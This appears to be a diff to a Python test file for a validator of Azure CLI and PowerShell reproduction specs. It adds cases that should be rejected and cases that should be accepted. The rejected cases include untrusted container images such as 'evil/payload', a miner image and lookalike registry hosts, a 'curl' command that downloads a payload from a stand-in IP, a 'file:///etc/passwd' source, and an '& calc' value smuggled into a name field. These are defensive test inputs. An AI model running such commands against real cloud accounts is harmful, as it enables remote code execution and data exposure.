@@ -61,6 +61,36 @@ AZ_CORPUS = {
     "url-file-scheme": ("storage", "blob", "copy", "start", "--source-uri", "file:///etc/passwd"),
     "bare-host": ("webapp", "config", "set", "-g", "{rg}", "-n", "{name1}", "--generic-configurations", "evil.com"),
     "image-foreign": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "docker.io/evil/miner"),
+    # Unqualified image references resolve to Docker Hub.
+    "image-bare-dockerhub": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload:latest"),
+    "image-library": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "alpine"),
+    "image-ip-registry": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "203.0.113.7:5000/payload"),
+    "image-localhost": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "localhost:5000/payload"),
+    "image-digest": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload@sha256:" + "a" * 64),
+    "image-mcr-lookalike": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com.evil.io/payload"),
+    "image-mcr-port": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com:443/payload"),
+    "image-mcr-no-path": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com"),
+    "image-twice": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld", "evil/payload"),
+    "image-equals": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image=evil/payload"),
+    "containerapp-image": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
+    "containerapp-image-short": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
+    "containerapp-update-image": ("containerapp", "update", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
+    "containerapp-job-image": ("containerapp", "job", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
+    "functionapp-image": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "evil/payload"),
+    "functionapp-image-short": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
+    "webapp-image-short": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "-i", "evil/payload"),
+    "webapp-container-image-name": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--container-image-name", "nginx"),
+    "webapp-deployment-image-name": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--deployment-container-image-name", "nginx"),
+    "webapp-config-container-short": ("webapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-c", "evil/payload"),
+    "webapp-create-c": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "-c", "evil/payload"),
+    "functionapp-config-container-c": ("functionapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-c", "evil/payload"),
+    "functionapp-config-container-i": ("functionapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
+    "logicapp-image-short": ("logicapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
+    "logicapp-image": ("logicapp", "create", "-g", "{rg}", "-n", "{name1}", "--deployment-container-image-name", "nginx"),
+    "containerapp-revision-copy-image": ("containerapp", "revision", "copy", "-g", "{rg}", "-n", "{name1}", "-i", "evil/payload"),
+    # Entrypoint overrides run arbitrary commands even in an allowlisted image.
+    "container-command-line": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azure-cli", "--command-line", "curl -sSLo /tmp/p 203.0.113.7/p"),
+    "containerapp-args": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azure-cli", "--args", "-c"),
     "aka-ms": ("storage", "account", "list", "-g", "{rg}", "--tags", "x=aka.ms/evil"),
     # Subscription, tenant and identity targeting.
     "subscription": ("storage", "account", "list", "--subscription", "Other Sub"),
@@ -201,6 +231,13 @@ PS_CORPUS = {
     "call-operator": ("Get-AzStorageAccount", {"ResourceGroupName": "{rg}", "Name": "& calc"}),
     "lowercase-verb": ("get-AzStorageAccount", {"ResourceGroupName": "{rg}"}),
     "module-qualified": ("Az.Storage\\Get-AzStorageAccount", {"ResourceGroupName": "{rg}"}),
+    # Container images must be fully qualified on MCR.
+    "container-group-image": ("New-AzContainerGroup", {"ResourceGroupName": "{rg}", "Name": "{name1}", "Image": "evil/payload"}),
+    "container-app-template-image": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": "evil/payload"}),
+    "container-app-image-list": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": ["evil/payload"]}),
+    "container-app-args": ("New-AzContainerAppTemplateObject", {"Name": "{name1}", "Image": "mcr.microsoft.com/azure-cli", "Arg": "-c"}),
+    "webapp-container-image": ("New-AzWebApp", {"ResourceGroupName": "{rg}", "Name": "{name1}", "ContainerImageName": "nginx"}),
+    "functionapp-docker-image": ("New-AzFunctionApp", {"ResourceGroupName": "{rg}", "Name": "{name1}", "DockerImageName": "evil/payload"}),
 }
 
 # The module under test must be allowlisted and ship a repro cmdlet.
@@ -334,3 +371,64 @@ def test_errors_do_not_echo_secret_values():
 
     assert result["valid"] is False
     assert secret not in " ".join(result["errors"])
+
+
+ALLOWED_IMAGE_STEPS = {
+    "container": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld:latest"),
+    "container-digest": ("container", "create", "-g", "{rg}", "-n", "{name1}", "--image", "mcr.microsoft.com/azuredocs/aci-helloworld@sha256:" + "a" * 64),
+    "containerapp": ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "-i", "mcr.microsoft.com/k8se/quickstart:latest"),
+    "webapp": ("webapp", "create", "-g", "{rg}", "-n", "{name1}", "-p", "{name2}", "--container-image-name", "mcr.microsoft.com/appsvc/staticsite:latest"),
+    "webapp-storage-custom-id": ("webapp", "config", "storage-account", "add", "-g", "{rg}", "-n", "{name1}", "-i", "share1", "-a", "{name2}", "--sn", "s", "-t", "AzureFiles"),
+    "vm-marketplace-image": ("vm", "create", "-g", "{rg}", "-n", "{name1}", "--image", "Ubuntu2204"),
+    # -i and -c mean something else outside the image commands.
+    "containerapp-env-infra-rg": ("containerapp", "env", "create", "-g", "{rg}", "-n", "{name1}", "-i", "{name2}"),
+    "containerapp-session-identifier": ("containerapp", "session", "stop", "-g", "{rg}", "-n", "{name1}", "-i", "session1"),
+    "functionapp-consumption-location": ("functionapp", "create", "-g", "{rg}", "-n", "{name1}", "-s", "{name2}", "-c", "{location}"),
+    "webapp-show-instance": ("webapp", "list-instances", "-g", "{rg}", "-n", "{name1}", "-i", "inst1"),
+}
+
+
+@pytest.mark.parametrize(
+    "argv", list(ALLOWED_IMAGE_STEPS.values()), ids=list(ALLOWED_IMAGE_STEPS),
+)
+def test_allowlisted_images_are_accepted(argv):
+    result = validate_spec(_az(*argv))
+
+    assert result["valid"] is True, result["errors"]
+
+
+def test_powershell_mcr_image_is_accepted():
+    result = validate_spec(_ps(
+        "New-AzContainerAppTemplateObject",
+        {"Name": "{name1}", "Image": "mcr.microsoft.com/k8se/quickstart:latest"},
+    ))
+
+    assert result["valid"] is True, result["errors"]
+
+
+_CONTAINER_YAML = {"extension": "yaml",
+                   "content": "properties:\n  containers:\n  - image: x/y\n"}
+
+
+@pytest.mark.parametrize("argv", [
+    ("container", "create", "-g", "{rg}", "--file", "{file}"),
+    ("containerapp", "create", "-g", "{rg}", "-n", "{name1}", "--yaml", "{file}"),
+    ("containerapp", "compose", "create", "-g", "{rg}", "--environment",
+     "{name1}", "--compose-file-path", "{file}"),
+    ("webapp", "config", "container", "set", "-g", "{rg}", "-n", "{name1}",
+     "--multicontainer-config-type", "COMPOSE",
+     "--multicontainer-config-file", "{file}"),
+    ("acr", "run", "-r", "{name1}", "-f", "{file}"),
+    ("acr", "build", "-r", "{name1}", "--file", "{file}"),
+    ("batch", "task", "create", "--job-id", "j", "--json-file", "{file}"),
+])
+def test_input_file_is_rejected_for_commands_that_run_its_content(argv):
+    result = validate_spec({**_az(*argv), "input_file": _CONTAINER_YAML})
+    assert any("{file} cannot be passed" in e for e in result["errors"])
+
+
+def test_powershell_input_file_is_rejected_for_container_nouns():
+    spec = {**_ps("New-AzContainerGroup", {"File": "{file}"}),
+            "input_file": _CONTAINER_YAML}
+    assert any("{file} cannot be passed" in e
+               for e in validate_spec(spec)["errors"])
